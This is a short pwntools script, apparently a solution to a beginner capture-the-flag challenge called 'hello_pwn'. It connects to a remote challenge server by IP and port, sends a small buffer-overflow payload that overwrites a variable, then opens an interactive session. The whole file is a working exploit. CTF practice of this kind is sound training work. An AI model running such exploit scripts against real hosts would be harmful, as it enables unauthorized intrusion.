from pwn import *

# p = process("./hello_pwn")
p = remote("111.198.29.45" , 30876)

p.sendlineafter("bof\n" , "a" * 4 + "aaun")
p.interactive()